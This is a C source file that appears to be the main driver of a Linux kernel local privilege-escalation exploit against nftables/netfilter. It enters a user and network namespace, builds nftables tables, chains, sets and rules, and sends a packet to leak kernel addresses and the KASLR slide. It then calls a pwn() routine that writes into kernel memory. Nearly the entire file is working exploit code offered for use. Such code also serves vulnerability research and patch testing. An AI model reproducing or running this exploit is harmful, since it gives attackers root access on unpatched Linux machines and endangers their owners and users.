#define _GNU_SOURCE 1
#include <time.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <linux/netfilter.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/set.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>
#include <limits.h>
#include <sched.h>

#include "helpers.h"
#include "exploit.h"

int main(int argc, char** argv, char** envp)
{
    // Use unique thread stack
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    sched_setaffinity(getpid(), sizeof(cpu_set_t), &set);
    
    enum mode choice;
    
    // cool trick from https://github.com/pqlx/CVE-2022-1015/blob/master/pwn.c
    if (argc < 2) {
        puts("[+] Dropping into network namespace");
    
        char* new_argv[] = {
            "/usr/bin/unshare",
            "-Urn",
            argv[0],
            "EXPLOIT",
            NULL
        };

        execve(new_argv[0], new_argv, envp);
        puts("Couldn't start unshare wrapper..");
        puts("Recompile the exploit with an appropriate unshare path.");
        exit(EXIT_FAILURE);
    }
    if (strcmp("EXPLOIT", argv[1])) {
        puts("[-] Something went wrong...");
        exit(EXIT_FAILURE);
    }
    
    puts("Choose an option:");
    puts("  1. Leak kernel TEXT address and regs address");
    puts("  2. Run the exploit");
    
    scanf("%d",  (int *) &choice);

    char *table_name = "mytable", 
         *base_chain_name = "base_chain",
         *exploit_chain_name = "exploit_chain",
         *set_name = "myset12",
         *dev_name = "eth0";

    puts("[+] Setting up the network namespace environment");
    system("./setup.sh");

    struct mnl_socket* nl = mnl_socket_open(NETLINK_NETFILTER);
    if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
        perror("[-] mnl_socket_bind");
        puts("[-] Check your CAP_NET_ADMIN capability");
        exit(EXIT_FAILURE);
    }

    // Wait for local traffic to cool down
    sleep(5);
    
    int seq = time(NULL);
    if (create_table(nl, table_name, NFPROTO_NETDEV, &seq, NULL) == -1) {
        perror("[-] Failed creating table");
        exit(EXIT_FAILURE);
    }
    printf("[+] Created table %s\n", table_name);

    struct unft_base_chain_param bp;
    // NF_INET_PRE_ROUTING and NF_BR_LOCAL_IN shoud also work
    bp.hook_num = NF_NETDEV_INGRESS;
    bp.prio = INT_MIN;
    if (create_chain(nl, table_name, base_chain_name, dev_name, NFPROTO_NETDEV, &bp, &seq, NULL)) {
        perror("[-] Failed creating base chain");
        exit(EXIT_FAILURE);
    }
    printf("[+] Created base chain %s\n", base_chain_name);

    if (create_chain(nl, table_name, exploit_chain_name, dev_name, NFPROTO_NETDEV, NULL, &seq, NULL)) {
        perror("[-] Failed creating exploit chain");
        exit(EXIT_FAILURE);
    }
    printf("[+] Created exploit chain %s\n", base_chain_name);

    if (create_set(nl, table_name, set_name, NFPROTO_NETDEV, &seq, NULL)) {
        perror("[-] Failed creating set");
        exit(EXIT_FAILURE);
    }
    printf("[+] Created exploit set\n");
    
    if (create_base_chain_rule_leak(nl, table_name, base_chain_name, NFPROTO_NETDEV, NULL, &seq)) {
        perror("[-] Failed creating base chain rule");
        exit(EXIT_FAILURE);
    }
    printf("[+] Created base chain rule\n");

    uint8_t offset = 19, len = 4, vlan_hlen = 4;
    uint8_t ethlen = len - offset + len - VLAN_ETH_HLEN + vlan_hlen;
    unsigned long found_addr;
    unsigned long found_instr;
    if (create_exploit_chain_rule_leak(nl, table_name, exploit_chain_name, NFPROTO_NETDEV, NULL, &seq, offset, len)) {
        perror("[-] Failed creating base chain rule");
        return EXIT_FAILURE;
    }
    printf("[+] offset: %hhu & len: %hhu & ethlen = %hhu\n", offset, len, ethlen);
    puts("[+] Successfully created exploit chain rule!");
    if (send_packet() == 0) {
        system("nft list map netdev mytable myset12 | ./run.sh > reg.log");
        found_addr = read_from_file(0);
        found_instr = read_from_file(1);
        printf("[+] Found regs address: 0x%lx\n", found_addr);
        printf("[+] Found instr address: 0x%lx\n", found_instr);
        printf("[+] KASLR slide: 0x%lx\n", found_instr - INSTR_BASE);
        system("nft delete table netdev mytable");
    }

    if (choice == LEAK_AND_PWN) {
        printf("[+] Inserting the needle into address 0x%lx\n", found_addr);
        sleep(5);
        return pwn(nl, found_addr, found_instr);
    }
    return EXIT_SUCCESS;
}
